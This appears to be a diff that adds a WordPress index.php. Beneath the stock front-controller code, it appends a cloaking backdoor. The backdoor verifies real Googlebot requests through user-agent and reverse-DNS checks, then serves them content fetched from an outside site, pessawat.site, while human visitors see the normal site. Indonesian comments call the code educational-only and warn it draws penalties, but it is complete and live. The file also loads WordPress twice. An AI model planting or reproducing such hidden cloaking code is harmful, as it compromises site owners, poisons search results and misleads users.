@@ -1,0 +1,68 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+
+// ========== INI HANYA EDUKASI ==========
+// JANGAN PAKAI! AKAN KENA PENALTI!
+
+// DETEKSI SEBELUM WORDPRESS LOAD
+function is_real_googlebot() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    // 1. Cek User-Agent
+    if (strpos($ua, 'Googlebot') === false) {
+        return false;
+    }
+    
+    // 2. Cek IP (Google punya range IP khusus)
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $hostname = gethostbyaddr($ip);
+    if (strpos($hostname, '.googlebot.com') === false) {
+        return false;
+    }
+    
+    // 3. DNS Lookup balik
+    $verified_ip = gethostbyname($hostname);
+    if ($verified_ip !== $ip) {
+        return false;
+    }
+    
+    return true;
+}
+
+// JIKA GOOGLEBOT ASLI
+if (is_real_googlebot() && $_SERVER['REQUEST_URI'] == '/') {
+    // Ambil konten dari sumber lain
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://pessawat.site/rezekigakkemana/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Googlebot/2.1');
+    
+    $content = curl_exec($ch);
+    curl_close($ch);
+    
+    if ($content) {
+        echo $content;
+        exit; // STOP sebelum WordPress
+    }
+}
+
+// LOAD WORDPRESS UNTUK MANUSIA
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
